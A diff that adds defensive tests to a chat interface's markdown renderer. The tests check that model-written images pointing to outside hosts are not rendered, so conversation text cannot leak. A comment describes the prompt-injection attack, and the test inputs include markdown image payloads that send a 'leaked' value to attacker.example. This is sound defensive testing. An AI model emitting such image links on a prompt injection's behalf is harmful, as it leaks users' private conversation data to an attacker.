@@ -74,3 +74,34 @@ describe('a mark the model wrote for itself', () => {
     expect(screen.getByRole('button', { name: 'rxn-suzuki-4821' })).toBeTruthy();
   });
 });
+
+describe('a model-emitted image cannot exfiltrate the conversation', () => {
+  it('does not emit an <img> for an absolute external URL', () => {
+    // The attack: a prompt-injected model writes an image whose src is an attacker host with the
+    // secret in the query string; the browser GETs it and the conversation text leaks. The CSP's
+    // img-src is the last line, but this component renders no such load at all.
+    const out = html('![secret](https://attacker.example/?q=leaked)');
+
+    expect(out).not.toContain('<img');
+    expect(out).not.toContain('attacker.example');
+    // The omission is visible rather than silent.
+    expect(screen.getByText(/image omitted: secret/)).toBeTruthy();
+  });
+
+  it('also refuses a protocol-relative host', () => {
+    const out = html('![](//attacker.example/pixel.gif)');
+
+    expect(out).not.toContain('<img');
+    expect(out).not.toContain('attacker.example');
+  });
+
+  it('still renders a same-origin path and an inlined data image', () => {
+    const local = html('![diagram](/assets/diagram.png)');
+    expect(local).toContain('<img');
+    expect(local).toContain('src="/assets/diagram.png"');
+
+    const data = html('![](data:image/png;base64,iVBORw0KGgo=)');
+    expect(data).toContain('<img');
+    expect(data).toContain('data:image/png;base64');
+  });
+});
